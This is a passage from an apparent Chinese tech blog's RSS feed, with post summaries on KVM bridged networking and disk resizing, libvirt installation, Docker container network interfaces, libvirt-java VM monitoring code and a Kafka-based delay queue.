&lt;p>给虚拟机配置桥接网络，参考&lt;a href="https://typesafe.cn/posts/linux-kvm/">Linux虚拟化技术KVM&lt;/a>，效果如图&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vm-manage-port-config.png" alt="">&lt;/p>
&lt;h4 id="配置trunk网卡">配置trunk网卡&lt;/h4>
&lt;p>使用ovs创建一个虚拟网桥。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-vlan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时网桥&lt;code>br-vlan&lt;/code>上是没有任何虚拟网卡的，然后关闭虚拟机，在&lt;code>virt-manager&lt;/code>上添加一个网络设备&lt;/p></description></item><item><title>KVM 虚拟机磁盘扩容</title><link>https://www.typesafe.cn/posts/kvm-disk-resize/</link><pubDate>Mon, 31 May 2021 19:20:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/kvm-disk-resize/</guid><description>&lt;h3 id="一镜像扩容">一、镜像扩容&lt;/h3>
&lt;p>注意：需要先关闭虚拟机才能操作，&lt;code>+&lt;/code>号前面有空格，后面没有空格。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>qemu-img resize test.qcow2 +80G
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>原镜像磁盘大小20GB，扩容完成后可使用以下命令查看&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>qemu-img info test.qcow2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>image: test.qcow2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file format: qcow2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>virtual size: 100G &lt;span style="color:#ff79c6">(&lt;/span>&lt;span style="color:#bd93f9">107374182400&lt;/span> bytes&lt;span style="color:#ff79c6">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>disk size: 885M
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cluster_size: &lt;span style="color:#bd93f9">65536&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Format specific information:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> compat: 1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lazy refcounts: &lt;span style="color:#8be9fd;font-style:italic">false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> refcount bits: &lt;span style="color:#bd93f9">16&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> corrupt: &lt;span style="color:#8be9fd;font-style:italic">false&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="二windows磁盘扩容">二、Windows磁盘扩容&lt;/h3>
&lt;p>Windows磁盘扩容比较方便，进入 &lt;strong>计算机管理&amp;gt;磁盘管理&lt;/strong> 找到新增的分区把它添加到需要的分区即可。&lt;/p>
&lt;h3 id="三linux磁盘扩容">三、Linux磁盘扩容&lt;/h3>
&lt;p>启动虚拟机后，进入虚拟机控制台，使用&lt;code>fdisk -l&lt;/code>命令查看磁盘信息。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Disk /dev/vda: &lt;span style="color:#bd93f9">100&lt;/span> GiB, &lt;span style="color:#bd93f9">107374182400&lt;/span> bytes, &lt;span style="color:#bd93f9">209715200&lt;/span> sectors
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Units: sectors of &lt;span style="color:#bd93f9">1&lt;/span> * &lt;span style="color:#8be9fd;font-style:italic">512&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector size &lt;span style="color:#ff79c6">(&lt;/span>logical/physical&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I/O size &lt;span style="color:#ff79c6">(&lt;/span>minimum/optimal&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disklabel type: dos
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk identifier: 0xe11f7f01
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Device Boot Start End Sectors Size Id Type
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/dev/vda1 * &lt;span style="color:#bd93f9">2048&lt;/span> &lt;span style="color:#bd93f9">2099199&lt;/span> &lt;span style="color:#bd93f9">2097152&lt;/span> 1G &lt;span style="color:#bd93f9">83&lt;/span> Linux
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/dev/vda2 &lt;span style="color:#bd93f9">2099200&lt;/span> &lt;span style="color:#bd93f9">41943039&lt;/span> &lt;span style="color:#bd93f9">39843840&lt;/span> 19G 8e Linux LVM
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk /dev/mapper/cl-root: &lt;span style="color:#bd93f9">17&lt;/span> GiB, &lt;span style="color:#bd93f9">18249416704&lt;/span> bytes, &lt;span style="color:#bd93f9">35643392&lt;/span> sectors
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Units: sectors of &lt;span style="color:#bd93f9">1&lt;/span> * &lt;span style="color:#8be9fd;font-style:italic">512&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector size &lt;span style="color:#ff79c6">(&lt;/span>logical/physical&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I/O size &lt;span style="color:#ff79c6">(&lt;/span>minimum/optimal&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk /dev/mapper/cl-swap: &lt;span style="color:#bd93f9">2&lt;/span> GiB, &lt;span style="color:#bd93f9">2147483648&lt;/span> bytes, &lt;span style="color:#bd93f9">4194304&lt;/span> sectors
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Units: sectors of &lt;span style="color:#bd93f9">1&lt;/span> * &lt;span style="color:#8be9fd;font-style:italic">512&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector size &lt;span style="color:#ff79c6">(&lt;/span>logical/physical&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I/O size &lt;span style="color:#ff79c6">(&lt;/span>minimum/optimal&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到这台虚拟机的磁盘大小已经有100GB了，但分区大小还是没有变化，只有初始大小20GB。&lt;/p></description></item><item><title>Linux虚拟化技术KVM</title><link>https://www.typesafe.cn/posts/linux-kvm/</link><pubDate>Sat, 29 May 2021 17:07:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/linux-kvm/</guid><description>&lt;p>在Windows平台上我们习惯于使用VmWare或者virtual box来实现虚拟化，虽然它们拥有Linux版本，但大多数企业都选择了使用KVM来做Linux平台的虚拟化，因此学习掌握KVM是一项必不可少的技能。&lt;/p>
&lt;h3 id="安装kvm">安装KVM&lt;/h3>
&lt;p>以centos为例，下面是安装KVM虚拟化的命令。&lt;/p>
&lt;pre tabindex="0">&lt;code>yum install -y qemu-kvm libvirt virt-install bridge-utils
&lt;/code>&lt;/pre>&lt;p>&lt;strong>这么多软件都是什么作用？&lt;/strong>&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>软件&lt;/th>
 &lt;th>作用&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>qemu-kvm&lt;/td>
 &lt;td>整合了QEMU 和 KVM 的一个软件。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>libvirt&lt;/td>
 &lt;td>封装了QEMU的接口，可以更加方便的操作虚拟机，并且提供了很多种编程语言的SDK。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>virt-install&lt;/td>
 &lt;td>用来创建虚拟机的命令行工具。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>bridge-utils&lt;/td>
 &lt;td>Linux网桥，用来配置虚拟机的桥接网络。&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;p>&lt;strong>kvm、qemu、qemu-kvm和libvirt到底有什么关系？&lt;/strong>&lt;/p>
&lt;p>KVM（Kernel Virtual Machine）是Linux的一个内核驱动模块，它需要CPU的支持，采用硬件辅助虚拟化技术Intel-VT、AMD-V；内存相关如Intel的EPT和AMD的RVI技术，使得它能够让Linux主机成为一个Hypervisor（虚拟机监控器）。&lt;/p>
&lt;p>QEMU是一个纯软件实现的虚拟机，它可以模拟CPU、内存、磁盘等其他硬件，让虚拟机认为自己底层就是硬件，其实这些都是QEMU模拟的，虚拟机的所有操作都要经过QEMU转译一层，也就导致了QEMU本身的性能较差。&lt;/p>
&lt;p>qemu-kvm是QEMU整合了KVM，把CPU虚拟化和内存虚拟化交给了KVM来做，自己来模拟IO设备，例如网卡和磁盘。这一套组合拳打下来，性能损失大大降低，相较于直接使用硬件，带来的损耗大概在1%-2%之间。&lt;/p>
&lt;p>libvirt是目前使用最为广泛的对KVM虚拟机进行管理的工具和API。Libvirtd是一个daemon进程，可以被本地的virsh调用，也可以被远程的virsh调用，Libvirtd调用qemu-kvm操作虚拟机。&lt;/p>
&lt;p>&lt;strong>启动libvirt&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>systemctl start libvirtd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>systemctl &lt;span style="color:#8be9fd;font-style:italic">enable&lt;/span> libvirtd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果你不想使用命令行工具来管理虚拟机，可以安装 virt-manager 。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y virt-manager
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在支持x11转发的ssh客户端（例如：&lt;a href="https://mobaxterm.mobatek.net/">MobaXterm&lt;/a>）上可以直接输入 virt-manager 来启动。&lt;/p>
&lt;h3 id="虚拟网络类型">虚拟网络类型&lt;/h3>
&lt;p>和vmware类型，kvm也支持多种类型的网络，主要分为三种。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>NAT模式&lt;/strong> 虚拟机需要把流量发送到宿主机，宿主机器转换网络信息后再发出，外部机器无法感知到虚拟机的存在。此种方式宿主机器相当于一个路由器，因此宿主机上会有一个和虚拟机同网段的IP，并且虚拟机的网关地址是宿主机的这个IP。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>主机模式&lt;/strong> 虚拟机只能互相访问，不能访问宿主机。此种方式与NAT模式类似，但它没有与虚拟机同网段的IP，因此虚拟机也不能借助于宿主机来访问外部网络。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>桥接模式&lt;/strong> 虚拟机和宿主机都关联在一个网桥上，因此虚拟机可以与宿主机在同一个网段，并且外部机器可以直接访问到虚拟机，虚拟机也可以借助网桥来访问外部网络。&lt;/p>
&lt;blockquote>
&lt;p>还有一种模式在openstack等云平台上使用较为广泛，网桥上绑定的物理网卡没有IP，对应交换机配置端口为trunk模式，虚拟机 端口连接到网桥上，并配置端口不同的VLAN tag以达到隔离和互联的目的。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ol>
&lt;p>NAT模式和主机模式都无需单独配置，接下来我们看下如何配置桥接网络。&lt;/p>
&lt;h3 id="配置桥接网络">配置桥接网络&lt;/h3>
&lt;p>物理网卡绑定到网桥上之后就会导致网络断开，因此我们需要把原IP配置到网桥上。&lt;/p>
&lt;pre tabindex="0">&lt;code># 进入网卡配置文件夹
cd /etc/sysconfig/network-scripts/
# 拷贝原网卡配置文件作为桥接网卡
cp ifcfg-enp134s0f0 ifcfg-br0
&lt;/code>&lt;/pre>&lt;p>修改 &lt;code>ifcfg-br0&lt;/code> 中的 &lt;code>TYPE=Ethernet&lt;/code> 为 &lt;code> TYPE=Bridge&lt;/code>，最终效果如下：&lt;/p></description></item><item><title>容器网络——如何为docker添加网卡？</title><link>https://www.typesafe.cn/posts/how-to-add-port-for-docker/</link><pubDate>Sun, 23 May 2021 13:37:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/how-to-add-port-for-docker/</guid><description>&lt;p>之前我们介绍 Network Namespace（以下简称 netns）和 veth pair 时说过 docker 是使用这些技术来实现的网络隔离，今天我们就来一探究竟，看下 docker 到底是如何做到的。&lt;/p>
&lt;h3 id="启动一个无网络的容器">启动一个无网络的容器&lt;/h3>
&lt;p>首先我们使用 &lt;code>--net=none&lt;/code> 参数启动一个无网络的容器，为了方便调试，这里我们使用了 centos 镜像。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker run -itd --name centos-test --net&lt;span style="color:#ff79c6">=&lt;/span>none centos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>启动成功之后我们进入容器内部确认一下是否无网卡。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">[&lt;/span>root@localhost ~&lt;span style="color:#ff79c6">]&lt;/span>&lt;span style="color:#6272a4"># docker ps&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>28dc2e8853df centos &lt;span style="color:#f1fa8c">&amp;#34;/bin/bash&amp;#34;&lt;/span> &lt;span style="color:#bd93f9">24&lt;/span> seconds ago Up &lt;span style="color:#bd93f9">23&lt;/span> seconds centos-test
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">[&lt;/span>root@localhost ~&lt;span style="color:#ff79c6">]&lt;/span>&lt;span style="color:#6272a4"># docker exec -it 28dc2e8853df bash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">[&lt;/span>root@28dc2e8853df /&lt;span style="color:#ff79c6">]&lt;/span>&lt;span style="color:#6272a4"># ip a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu &lt;span style="color:#bd93f9">65536&lt;/span> qdisc noqueue state UNKNOWN group default qlen &lt;span style="color:#bd93f9">1000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inet 127.0.0.1/8 scope host lo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> valid_lft forever preferred_lft forever
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到确实只有一个本地环回网卡。&lt;/p></description></item><item><title>使用libvirt-java采集KVM虚拟机状态信息</title><link>https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/</link><pubDate>Wed, 19 May 2021 20:18:20 +0800</pubDate><guid>https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/</guid><description>&lt;p>虚拟化开发相较于普通开发是一个冷门的方向，大多数是使用Python开发，其中使用Java来做虚拟化的少之又少，资料更是少的可怜，为了实现需求我也是踩了不少坑，今天就为大家分享一下如何使用 &lt;code>libvirt-java&lt;/code> 来采集KVM虚拟机的资源使用信息。&lt;/p>
&lt;h3 id="cpu使用率">CPU使用率&lt;/h3>
&lt;p>&lt;code>libvirt&lt;/code>并没有直接提供获取虚拟机CPU使用率的接口，需要我们自己来计算，网上分享的代码或者公式五花八门，大部分都是错误的，经过我的测试，找到了一个相对准确的计算公式。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-latex" data-lang="latex">&lt;span style="display:flex;">&lt;span>cpu&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>usage = (cpu&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>time&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>now - cpu&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>time&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>t&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>second&lt;span style="color:#8be9fd;font-style:italic">_&lt;/span>ago) * 100 / (t * vCpus * 10&lt;span style="color:#8be9fd;font-style:italic">^&lt;/span>9)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Java代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// t秒前的CPU时间&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">long&lt;/span> c1 &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getInfo&lt;/span>().&lt;span style="color:#50fa7b">cpuTime&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Thread.&lt;span style="color:#50fa7b">sleep&lt;/span>(1000);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 当前CPU时间&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">long&lt;/span> c2 &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getInfo&lt;/span>().&lt;span style="color:#50fa7b">cpuTime&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// 虚拟CPU数量&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd">int&lt;/span> vCpus &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getMaxVcpus&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// t 为1秒&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Double cpuUsage &lt;span style="color:#ff79c6">=&lt;/span> 100 &lt;span style="color:#ff79c6">*&lt;/span> (c2 &lt;span style="color:#ff79c6">-&lt;/span> c1) &lt;span style="color:#ff79c6">/&lt;/span> (1 &lt;span style="color:#ff79c6">*&lt;/span> vCpus &lt;span style="color:#ff79c6">*&lt;/span> Math.&lt;span style="color:#50fa7b">pow&lt;/span>(10, 9));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log.&lt;span style="color:#50fa7b">debug&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;虚拟机[{}]CPU使用率为: {}&amp;#34;&lt;/span>, uuid, cpuUsage);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="内存使用率">内存使用率&lt;/h3>
&lt;p>不要使用&lt;code>domain.getInfo()&lt;/code>返回的 &lt;code>memory&lt;/code>字段，虽然它注释写的是&lt;code>the memory in KBytes used by the domain&lt;/code>，但它的意思真的不是虚拟机内部进程已使用的内存大小，而是从宿主机器的角度来看分配给这个虚拟机的内存它使用了多少，如果没有特殊配置，它会和&lt;code>maxMem&lt;/code>字段的值是相同的。&lt;/p>
&lt;p>正确做法是使用&lt;code>domain.memoryStats(10)&lt;/code>来获取，那为什么参数要输入一个&lt;code>10&lt;/code>呢？这是因为&lt;code>10&lt;/code>代表的是要返回的信息数量，经过我手动执行&lt;code>virsh dommemstat uuid&lt;/code> 测试发现有10个参数返回，所以需要填入&lt;code>10&lt;/code>。另外命令返回的&lt;code>unused&lt;/code> 字段值与数组中&lt;code>tag=8&lt;/code>的数据一致，最终我们获取到了未使用的内存大小，计算内存使用率更是轻轻松松。&lt;/p>
&lt;p>Java代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>MemoryStatistic&lt;span style="color:#ff79c6">[]&lt;/span> memoryStatistics &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">memoryStats&lt;/span>(10);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Optional&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>MemoryStatistic&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> first &lt;span style="color:#ff79c6">=&lt;/span> Arrays.&lt;span style="color:#50fa7b">stream&lt;/span>(memoryStatistics).&lt;span style="color:#50fa7b">filter&lt;/span>(x &lt;span style="color:#ff79c6">-&amp;gt;&lt;/span> x.&lt;span style="color:#50fa7b">getTag&lt;/span>() &lt;span style="color:#ff79c6">==&lt;/span> 8).&lt;span style="color:#50fa7b">findFirst&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> (first.&lt;span style="color:#50fa7b">isPresent&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MemoryStatistic memoryStatistic &lt;span style="color:#ff79c6">=&lt;/span> first.&lt;span style="color:#50fa7b">get&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">long&lt;/span> unusedMemory &lt;span style="color:#ff79c6">=&lt;/span> memoryStatistic.&lt;span style="color:#50fa7b">getValue&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">long&lt;/span> maxMemory &lt;span style="color:#ff79c6">=&lt;/span> domain.&lt;span style="color:#50fa7b">getMaxMemory&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">double&lt;/span> memoryUsage &lt;span style="color:#ff79c6">=&lt;/span> (maxMemory &lt;span style="color:#ff79c6">-&lt;/span> unusedMemory) &lt;span style="color:#ff79c6">*&lt;/span> 100.&lt;span style="color:#50fa7b">0&lt;/span> &lt;span style="color:#ff79c6">/&lt;/span> maxMemory;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log.&lt;span style="color:#50fa7b">debug&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;虚拟机[{}]内存使用率为: {}&amp;#34;&lt;/span>, uuid, memoryUsage);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="网卡数据包信息">网卡数据包信息&lt;/h3>
&lt;p>同样&lt;code>libvirt&lt;/code>并没有提供获取虚拟机网卡的接口，因此需要获取虚拟机的xml文件来查询。&lt;/p></description></item><item><title>基于kafka实现延迟队列</title><link>https://www.typesafe.cn/posts/kafka-delay-queue/</link><pubDate>Sun, 18 Apr 2021 00:08:38 +0800</pubDate><guid>https://www.typesafe.cn/posts/kafka-delay-queue/</guid><description>&lt;h1 id="基于kafka实现延迟队列">基于kafka实现延迟队列&lt;/h1>
&lt;p>kafka作为一个使用广泛的消息队列，很多人都不会陌生，但当你在网上搜索“kafka 延迟队列”，出现的都是一些讲解时间轮或者只是提供了一些思路，并没有一份真实可用的代码实现，今天我们就来打破这个现象，提供一份可运行的代码，抛砖引玉，吸引更多的大神来分享。&lt;/p>
&lt;h3 id="基于kafka如何实现延迟队列">基于kafka如何实现延迟队列？&lt;/h3>
&lt;p>想要解决一个问题，我们需要先分解问题。kafka作为一个高性能的消息队列，只要消费能力足够，发出的消息都是会立刻收到的，因此我们需要想一个办法，让消息延迟发送出去。&lt;/p>
&lt;p>网上已经有大神给出了如下方案：&lt;/p>
&lt;ol>
&lt;li>在发送延迟消息时不直接发送到目标topic，而是发送到一个用于处理延迟消息的topic，例如&lt;code>delay-minutes-1&lt;/code>&lt;/li>
&lt;li>写一段代码拉取&lt;code>delay-minutes-1&lt;/code>中的消息，将满足条件的消息发送到真正的目标主题里。&lt;/li>
&lt;/ol>
&lt;p>就像画一匹马一样简单。&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/uPic/%E6%80%8E%E6%A0%B7%E7%94%BB%E9%A9%AC.jpeg" alt="怎样画马">&lt;/p>
&lt;p>方案是好的，但是我们还需要更多细节。&lt;/p>
&lt;h3 id="完善细节">完善细节&lt;/h3>
&lt;p>&lt;strong>问题出在哪里？&lt;/strong>&lt;/p>
&lt;p>问题出在延迟消息发出去之后，代码程序就会立刻收到延迟消息，要如何处理才能让延迟消息等待一段时间才发送到真正的topic里面。&lt;/p>
&lt;p>可能有同学会觉得很简单嘛，在代码程序收到消息之后判断条件不满足，就调用&lt;code>sleep&lt;/code>方法，过了一段时间我再进行下一个循环拉取消息。&lt;/p>
&lt;p>&lt;strong>真的可行吗?&lt;/strong>&lt;/p>
&lt;p>一切好像都很美好，但这是不可行的。&lt;/p>
&lt;p>这是因为在轮询kafka拉取消息的时候，它会返回由&lt;code>max.poll.records&lt;/code>配置指定的一批消息，但是当程序代码不能在&lt;code>max.poll.interval.ms&lt;/code>配置的期望时间内处理这些消息的话，kafka就会认为这个消费者已经挂了，会进行&lt;code>rebalance&lt;/code>，同时你这个消费者就无法再拉取到任何消息了。&lt;/p>
&lt;p>举个例子：当你需要一个24小时的延迟消息队列，在代码里面写下了&lt;code>Thread.sleep(1000*60*60*24);&lt;/code>，为了不发生&lt;code>rebalance&lt;/code>，你把&lt;code>max.poll.interval.ms&lt;/code> 也改成了&lt;code>1000*60*60*24&lt;/code>，这个时候你或许会感觉到一丝丝的怪异，我是谁？我在哪？我为什么要写出来这样的代码？&lt;/p>
&lt;p>&lt;strong>其实我们可以更优雅的处理这个问题。&lt;/strong>&lt;/p>
&lt;p>KafkaConsumer 提供了暂停和恢复的API函数，调用消费者的暂停方法后就无法再拉取到新的消息，同时长时间不消费kafka也不会认为这个消费者已经挂掉了。另外为了能够更加优雅，我们会启动一个定时器来替换&lt;code>sleep&lt;/code>。，完整流程如下图，当消费者发现消息不满足条件时，我们就暂停消费者，并把偏移量seek到上一次消费的位置以便等待下一个周期再次消费这条消息。&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/uPic/kafka-delay-queue.png" alt="kafka-delay-queue">&lt;/p>
